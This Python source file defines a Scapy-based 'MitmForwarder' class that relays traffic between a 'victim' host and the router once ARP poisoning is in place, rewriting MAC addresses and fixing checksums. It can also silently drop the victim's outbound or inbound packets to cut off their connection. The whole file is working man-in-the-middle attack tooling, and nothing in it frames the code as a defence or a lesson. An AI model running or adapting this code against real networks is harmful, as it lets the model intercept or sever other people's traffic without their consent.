from scapy.all import IP, Ether, AsyncSniffer, conf


class MitmForwarder:
    """
    Simple user-space forwarder that optionally drops traffic in one direction.
    It assumes ARP poisoning is already in place so frames arrive at our NIC.
    Uses persistent L2 socket to avoid Windows socket exhaustion.
    """

    def __init__(self, debug=False):
        self.running = False
        self.sniffer = None
        self.victim = None
        self.router = None
        self.iface = None
        self.my_mac = None
        self.drop_from_victim = False
        self.drop_to_victim = False
        self._pkt_count = 0
        self._drop_count = 0
        self._fwd_count = 0
        self._debug = debug
        self._socket = None  # Persistent L2 socket

    def start(
        self,
        victim: dict,
        router: dict,
        iface_name: str,
        iface_mac: str,
        should_drop=None,
        drop_from_victim: bool = False,
        drop_to_victim: bool = False,
    ):
        """
        Start capturing traffic for victim/router and rewrite MACs before sending.
        """
        self.stop()
        self.victim = victim
        self.router = router
        self.iface = iface_name
        self.my_mac = iface_mac
        self.drop_from_victim = drop_from_victim
        self.drop_to_victim = drop_to_victim
        self.running = True

        if not (self.victim.get('ip') and self.victim.get('mac')):
            print('[forwarder] victim information incomplete; not starting')
            self.running = False
            return
        if not (self.router.get('ip') and self.router.get('mac')):
            print('[forwarder] router information incomplete; not starting')
            self.running = False
            return

        # Create persistent L2 socket
        try:
            self._socket = conf.L2socket(iface=self.iface)
            if self._debug:
                print(f"[forwarder] L2 socket created for {self.iface}")
        except Exception as e:
            if self._debug:
                print(f"[forwarder] Failed to create L2 socket: {e}")
            self._socket = None

        bpf = f"ip and host {self.victim['ip']}"
        if self._debug:
            print(f"[forwarder] Starting on {self.iface}")
            print(f"[forwarder] victim={self.victim['ip']}/{self.victim['mac']}")
            print(f"[forwarder] router={self.router['ip']}/{self.router['mac']}")
            print(f"[forwarder] drop_from_victim={self.drop_from_victim}, drop_to_victim={self.drop_to_victim}")
        try:
            self.sniffer = AsyncSniffer(
                iface=self.iface,
                filter=bpf,
                prn=self._process_packet,
                store=False
            )
            self.sniffer.start()
            if self._debug:
                print(f"[forwarder] Sniffer started successfully")
        except Exception as e:
            if self._debug:
                print(f"[forwarder] Sniffer failed: {e}")
            self.running = False
            self.sniffer = None

    def stop(self):
        if self.sniffer:
            try:
                self.sniffer.stop()
            except Exception:
                pass
            self.sniffer = None
        # Close persistent socket
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None
        self.running = False
    
    def get_stats(self):
        """Return current packet statistics"""
        return {
            'running': self.running,
            'packets_seen': self._pkt_count,
            'packets_dropped': self._drop_count,
            'packets_forwarded': self._fwd_count,
            'drop_from_victim': self.drop_from_victim,
            'drop_to_victim': self.drop_to_victim,
        }

    def _process_packet(self, pkt):
        if not self.running or not pkt.haslayer(IP) or not pkt.haslayer(Ether):
            return

        ip_layer = pkt[IP]
        src = ip_layer.src
        dst = ip_layer.dst
        self._pkt_count += 1

        # Debug first few packets
        if self._debug and self._pkt_count <= 5:
            print(f"[forwarder] pkt#{self._pkt_count}: {src} -> {dst}")

        # Outbound: victim -> router/internet
        if src == self.victim['ip']:
            if self.drop_from_victim:
                self._drop_count += 1
                if self._debug and self._drop_count <= 3:
                    print(f"[forwarder] DROPPING outbound: {src} -> {dst}")
                return  # packet dies here
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.router['mac']
            self._fix_checksums(pkt)
            self._send(pkt)
            self._fwd_count += 1

        # Inbound: router -> victim
        elif dst == self.victim['ip']:
            if self.drop_to_victim:
                self._drop_count += 1
                if self._debug and self._drop_count <= 3:
                    print(f"[forwarder] DROPPING inbound: {src} -> {dst}")
                return
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.victim['mac']
            self._fix_checksums(pkt)
            self._send(pkt)
            self._fwd_count += 1
        
        # Periodic stats
        if self._debug and self._pkt_count % 100 == 0:
            print(f"[forwarder] stats: {self._pkt_count} seen, {self._drop_count} dropped, {self._fwd_count} fwd")

    def _send(self, pkt):
        """Send using persistent socket, prevents Windows socket exhaustion"""
        try:
            if self._socket:
                self._socket.send(pkt)
            else:
                # Fallback (shouldn't happen normally)
                from scapy.all import sendp
                sendp(pkt, iface=self.iface, verbose=0)
        except Exception:
            pass

    @staticmethod
    def _fix_checksums(pkt):
        # Force recalculation to avoid checksum issues after modifications
        try:
            if IP in pkt and hasattr(pkt[IP], 'chksum'):
                del pkt[IP].chksum
            if IP in pkt and hasattr(pkt[IP], 'len'):
                del pkt[IP].len
            if pkt.haslayer('TCP') and hasattr(pkt['TCP'], 'chksum'):
                del pkt['TCP'].chksum
            if pkt.haslayer('UDP') and hasattr(pkt['UDP'], 'chksum'):
                del pkt['UDP'].chksum
        except Exception:
            pass
